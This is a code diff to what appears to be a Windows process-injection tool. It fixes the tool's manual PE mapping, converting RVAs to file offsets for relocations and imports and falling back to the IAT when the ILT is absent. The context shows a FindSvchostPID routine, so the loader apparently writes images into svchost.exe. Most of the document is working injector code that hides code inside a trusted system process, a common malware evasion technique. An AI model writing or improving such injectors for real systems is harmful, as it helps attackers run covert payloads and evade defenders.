@@ -53,6 +53,19 @@ static DWORD FindSvchostPID(void) {
     return pid;
 }
 
+// Map an RVA in the image to a raw file offset in localBuf.
+// Required: MinGW section VMA != PointerToRawData (e.g. .idata RVA 0x10000,
+// file off 0xa600). Reading localBuf+rva would walk off the buffer and crash.
+static DWORD RvaToFileOffset(PIMAGE_NT_HEADERS ntH, DWORD rva) {
+    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(ntH);
+    for (WORD i = 0; i < ntH->FileHeader.NumberOfSections; i++) {
+        DWORD va = sec[i].VirtualAddress;
+        DWORD vsz = sec[i].Misc.VirtualSize ? sec[i].Misc.VirtualSize : sec[i].SizeOfRawData;
+        if (rva >= va && rva < va + vsz) return sec[i].PointerToRawData + (rva - va);
+    }
+    return rva;
+}
+
 // Apply PE relocations from the .reloc section to the remote process.
 // delta = remoteImage - targetBase. Required when the image is loaded at a
 // different base than its preferred one. Skips if the .reloc section is empty
@@ -61,7 +74,7 @@ static BOOL ApplyRelocations(HANDLE hProc, LPVOID remoteImage, PIMAGE_NT_HEADERS
     PIMAGE_DATA_DIRECTORY relocDir = &ntH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
     if (relocDir->Size == 0) return TRUE;
 
-    PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)(localBuf + relocDir->VirtualAddress);
+    PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)(localBuf + RvaToFileOffset(ntH, relocDir->VirtualAddress));
     DWORD offset = 0;
     while (offset < relocDir->Size) {
         if (reloc->SizeOfBlock == 0) break;
@@ -190,10 +203,10 @@ static BOOL ResolveImports(HANDLE hProc, LPVOID remoteImage, PIMAGE_NT_HEADERS n
     PIMAGE_DATA_DIRECTORY importDir = &ntH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
     if (importDir->Size == 0) { LogMessage(L"[*] no import directory"); return TRUE; }
 
-    PIMAGE_IMPORT_DESCRIPTOR import = (PIMAGE_IMPORT_DESCRIPTOR)(localBuf + importDir->VirtualAddress);
+    PIMAGE_IMPORT_DESCRIPTOR import = (PIMAGE_IMPORT_DESCRIPTOR)(localBuf + RvaToFileOffset(ntH, importDir->VirtualAddress));
     int dllCount = 0, funcCount = 0;
     for (; import->Name; import++) {
-        const char* dllNameA = (const char*)(localBuf + import->Name);
+        const char* dllNameA = (const char*)(localBuf + RvaToFileOffset(ntH, import->Name));
         wchar_t dllName[256];
         MultiByteToWideChar(CP_ACP, 0, dllNameA, -1, dllName, 256);
         dllCount++;
@@ -213,7 +226,9 @@ static BOOL ResolveImports(HANDLE hProc, LPVOID remoteImage, PIMAGE_NT_HEADERS n
         wsprintfW(dbg, L"[+] IAT: %s found at %p", dllName, remoteDllBase);
         LogMessage(dbg);
 
-        PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)(localBuf + import->OriginalFirstThunk);
+        // ILT (OriginalFirstThunk) may be 0 in some PEs; fall back to IAT (FirstThunk).
+        DWORD oltRva = import->OriginalFirstThunk ? import->OriginalFirstThunk : import->FirstThunk;
+        PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)(localBuf + RvaToFileOffset(ntH, oltRva));
         LPBYTE remoteIat = (LPBYTE)remoteImage + import->FirstThunk;
         for (; thunk->u1.AddressOfData; thunk++, remoteIat += sizeof(PVOID)) {
             LPVOID funcAddr = NULL;
@@ -223,7 +238,7 @@ static BOOL ResolveImports(HANDLE hProc, LPVOID remoteImage, PIMAGE_NT_HEADERS n
                 LogMessage(buf);
                 return FALSE;
             }
-            PIMAGE_IMPORT_BY_NAME ibn = (PIMAGE_IMPORT_BY_NAME)(localBuf + thunk->u1.AddressOfData);
+            PIMAGE_IMPORT_BY_NAME ibn = (PIMAGE_IMPORT_BY_NAME)(localBuf + RvaToFileOffset(ntH, thunk->u1.AddressOfData));
             funcAddr = FindExportByName(hProc, remoteDllBase, (const char*)ibn->Name);
             if (!funcAddr) {
                 wchar_t buf[256];
